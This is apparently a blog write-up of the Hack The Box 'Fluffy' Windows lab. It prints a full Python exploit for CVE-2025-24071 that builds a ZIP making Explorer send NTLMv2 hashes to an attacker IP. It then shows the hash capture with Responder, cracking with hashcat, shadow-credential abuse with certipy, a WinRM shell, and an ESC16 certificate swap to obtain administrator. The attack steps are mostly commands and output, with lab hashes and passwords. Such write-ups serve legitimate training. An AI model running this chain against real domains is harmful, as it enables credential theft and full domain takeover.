+++
title = "HTB-Fluffy Writeups"
date = 2026-01-15T00:00:00Z
draft = false
description = "Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided"
tags = ["hugo", "cloudflare", "github", "blowfish", "static-site"]
+++
# Phase 1: External Reconnaissance and Initial Access

## Objective

Identify and exploit externally accessible vulnerabilities to gain initial foothold into the target network.

Machine Information

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

---

## Detailed Walkthrough

### Step 1: Reconnaissance

```bash
# Port scanning
nmap -sV -sC -p- 10..10.232.88
# Nmap 7.94SVN scan initiated Tue Oct 28 14:21:48 2025 as: nmap -Pn -sS -sVC -p- -oN nmap-Fluffy-28.10.2025 10.129.232.88
Nmap scan report for 10.129.232.88
Host is up (0.040s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 14:31:13Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:51+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:49+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:51+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:49+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49757/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-28T14:32:10
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

```

```bash 
❯ netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
❯ netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
❯ smbclient //10.129.232.88/IT -U 'j.fleischman' -p 'J0elTHEM4n1990!'
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 28 21:30:04 2025
  ..                                  D        0  Tue Oct 28 21:30:04 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 22:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 22:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 22:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 22:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 21:31:07 2025

                5842943 blocks of size 4096. 1579442 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (23.5 KiloBytes/sec) (average 23.5 KiloBytes/sec)
```

``Found information about CVE-2025-24071  -Windows File Explorer Spoofing``
```python
CVE-2025-24071.py 

import os
import zipfile
import argparse
import time
import sys
import itertools
from colorama import init, Fore, Style

init()

def loading_animation(duration):
    """Display a simple loading animation for specified duration"""
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(f'\r{Fore.YELLOW}Processing {next(spinner)}{Style.RESET_ALL}')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r')

def print_ascii_art():
    """Print ASCII art banner"""
    art = r"""
          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    """
    print(f"{Fore.CYAN}{art}{Style.RESET_ALL}")

def show_affected_versions():
    """Display list of affected versions"""
    affected_versions = [
        "Windows 10 Version 1809 for x64-based Systems",
        "Windows 10 Version 1809 for 32-bit Systems",
        "Windows Server 2025 (Server Core installation)",
        "Windows Server 2025",
        "Windows Server 2012 R2 (Server Core installation)",
        "Windows Server 2012 R2",
        "Windows Server 2016 (Server Core installation)",
        "Windows Server 2016",
        "Windows 10 Version 1607 for x64-based Systems",
        "Windows 10 Version 1607 for 32-bit Systems",
        "Windows 10 for x64-based Systems",
        "Windows 10 for 32-bit Systems",
        "Windows 11 Version 24H2 for x64-based Systems",
        "Windows 11 Version 24H2 for ARM64-based Systems",
        "Windows Server 2022, 23H2 Edition (Server Core installation)",
        "Windows 11 Version 23H2 for x64-based Systems",
        "Windows 11 Version 23H2 for ARM64-based Systems",
        "Windows 10 Version 22H2 for 32-bit Systems",
        "Windows 10 Version 22H2 for ARM64-based Systems",
        "Windows 10 Version 22H2 for x64-based Systems",
        "Windows 11 Version 22H2 for x64-based Systems",
        "Windows 11 Version 22H2 for ARM64-based Systems",
        "Windows 10 Version 21H2 for x64-based Systems",
        "Windows 10 Version 21H2 for ARM64-based Systems",
        "Windows 10 Version 21H2 for 32-bit Systems",
        "Windows Server 2022 (Server Core installation)",
        "Windows Server 2022",
        "Windows Server 2019 (Server Core installation)",
        "Windows Server 2019"
    ]
    print(f"{Fore.GREEN}Affected versions:{Style.RESET_ALL}")
    for version in affected_versions:
        print(f"- {version}")

def create_exploit(file_name, ip_address):
    print_ascii_art()
    print(f"{Fore.GREEN}Creating exploit with filename: {file_name}.library-ms{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Target IP: {ip_address}{Style.RESET_ALL}\n")

    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

    library_filename = f"{file_name}.library-ms"

    print(f"{Fore.BLUE}Generating library file...{Style.RESET_ALL}")
    loading_animation(1.5)
    try:
        with open(library_filename, 'w', encoding='utf-8') as f:
            f.write(library_content)
        print(f"{Fore.GREEN}✓ Library file created successfully{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}✗ Error writing file: {e}{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Creating ZIP archive...{Style.RESET_ALL}")
    loading_animation(1.5)
    try:
        with zipfile.ZipFile('exploit.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(library_filename)
        print(f"{Fore.GREEN}✓ ZIP file created successfully{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}✗ Error creating ZIP file: {e}{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Cleaning up temporary files...{Style.RESET_ALL}")
    loading_animation(1.0)
    try:
        if os.path.exists(library_filename):
            os.remove(library_filename)
        print(f"{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}")
    except OSError:
        print(f"{Fore.RED}✗ Warning: Could not delete {library_filename}{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}Process completed successfully!{Style.RESET_ALL}")
    print(f"Output file: {Fore.YELLOW}exploit.zip{Style.RESET_ALL}")
    print(f"Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.")
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Create an exploit ZIP file or show affected versions')
    parser.add_argument('-f', '--file-name', 
                        help='Name of the library file (without extension)')
    parser.add_argument('-i', '--ip-address', 
                        help='IP address (e.g., 192.168.1.111)')
    parser.add_argument('-afv', '--affected-versions', action='store_true', 
                        help='Display affected versions')

    args = parser.parse_args()


    if not (args.file_name or args.ip_address or args.affected_versions):
        print(f"{Fore.RED}✗ Error: No arguments provided{Style.RESET_ALL}")
        parser.print_help()
    
    elif args.affected_versions:
        show_affected_versions()
      
        if args.file_name and args.ip_address:
            print(f"\n{Fore.YELLOW}Proceeding with exploit creation...{Style.RESET_ALL}")
            create_exploit(args.file_name, args.ip_address)
       
        elif args.file_name or args.ip_address:
            print(f"\n{Fore.RED}✗ Error: Both --file-name and --ip-address are required for exploit creation{Style.RESET_ALL}")
    
   
    else:
        if args.file_name and args.ip_address:
            create_exploit(args.file_name, args.ip_address)
        else:
            print(f"{Fore.RED}✗ Error: Both --file-name and --ip-address are required{Style.RESET_ALL}")
            parser.print_help() 

```

``Create zip file and upload it to IT share and received NTLMv2 hash with Responder``
```bash
 python3 CVE-2025-24071.py -f whichuserauth -i 10.10.16.6

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|


                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                              


Creating exploit with filename: whichuserauth.library-ms
Target IP: 10.10.16.6

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.

```

```bash 
smb: \>
smb: \> put exploit.zip
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip putting file exploit.zip as \exploit.zip (1.0 kb/s) (average 1.0 kb/s)

```

```bash 
❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
   
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.6]
    Responder IPv6             [dead:beef:4::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LO25BT4VEVZ]
    Responder Domain Name      [HJXI.LOCAL]
    Responder DCE-RPC Port     [45904]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:5fa13cf1232a1356:0923FB511FC78CD8CC088BFF0AB720CC:010100000000000080EBAB3A1948DC0166AA78B465A299AD000000000200080048004A005800490001001E00570049004E002D004C004F00320035004200540034005600450056005A0004003400570049004E002D004C004F00320035004200540034005600450056005A002E0048004A00580049002E004C004F00430041004C000300140048004A00580049002E004C004F00430041004C000500140048004A00580049002E004C004F00430041004C000700080080EBAB3A1948DC0106000400020000000800300030000000000000000100000000200000042D1A8A904C106382370A114E46BE9EBF28AA6694479032667325B9468FE8680A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[+] Exiting...

```
``Crack with hashcat``
```bash 
❯ hashcat p.agila.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:5fa13cf1232a1356:0923fb511fc78cd8cc088bff0ab720cc:010100000000000080ebab3a1948dc0166aa78b465a299ad000000000200080048004a005800490001001e00570049004e002d004c004f00320035004200540034005600450056005a0004003400570049004e002d004c004f00320035004200540034005600450056005a002e0048004a00580049002e004c004f00430041004c000300140048004a00580049002e004c004f00430041004c000500140048004a00580049002e004c004f00430041004c000700080080ebab3a1948dc0106000400020000000800300030000000000000000100000000200000042d1a8a904c106382370a114e46be9ebf28aa6694479032667325b9468fe8680a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0036000000000000000000:prometheusx-303

```

``Further enumerating with bloodhound``
```bash 
bloodhound-python -c All -u P.AGILA -p prometheusx-303 -d fluffy.htb -dc DC01.fluffy.htb -ns 10.129.232.88 --zip
```

``p.agila is member of Service Account Managers group and Service Account Managers group have GenericALl over Service Accounts --> winrm_svc , ca_svc, ldap_svc .
ca_svc is most interesting part because it can escalate to administrators  from certificate misconfiguration``

``Let's add p.agila to Service Accounts Group ``
```bash 
net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB/p.agila%prometheusx-303" -S "10.129.232.88"
net rpc group members "Service Accounts" -U "FLUFFY.HTB/p.agila%prometheusx-303" -S "10.129.232.88"
```

```bash
pywhisker  -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"

[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: c2a4e550-08b3-2bf5-a49d-8b51a6fc5ca9
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: SG4qnzTD.pfx
[*] Must be used with password: SJczoYZqMYaA3FcnefEM
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```
``--> this does not work and drop all the time.``

``Let's use another tool. ``
```bash
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts


 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c'
[*] Adding Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```

``request all winrm_svc,ca_svc,ldap_svc`` 
```bash 
❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c'
[*] Adding Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4d9bd5d9-c567-808f-a187-46824098f458'
[*] Adding Key Credential with device ID '4d9bd5d9-c567-808f-a187-46824098f458' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '4d9bd5d9-c567-808f-a187-46824098f458' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ldap_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ldap_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3f841766-64b1-eaed-ee36-4581bf16f9db'
[*] Adding Key Credential with device ID '3f841766-64b1-eaed-ee36-4581bf16f9db' to the Key Credentials for 'ldap_svc'
[*] Successfully added Key Credential with device ID '3f841766-64b1-eaed-ee36-4581bf16f9db' to the Key Credentials for 'ldap_svc'
[*] Authenticating as 'ldap_svc' with the certificate
[*] Using principal: ldap_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37

```

``Get user.txt with winrm_svc``
```bash
❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767


Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop/
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/28/2025   7:12 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
dbd7a0a2f<REDACTED>
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>

```


```bash
# Deploy persistence
❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767


Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop/
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/28/2025   7:12 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
dbd7a0a2fb1b09180baf50878c70781b
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>

```

``Let's find vulnerable templates``
```bash
certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

``Vulnerabilities ESC16 : Security Extension is disabled.`` 

``We can read about upn (userPrincipleName) ca_svc from winrm_svc ``
```bash 
❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
❯
```


``We can update userPrincipleName of ca_svc to administrator ``
```
❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
❯
```

``Request certificate of administrator``
```
❯ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

``We change upn of ca_svc back to original ``
```
❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
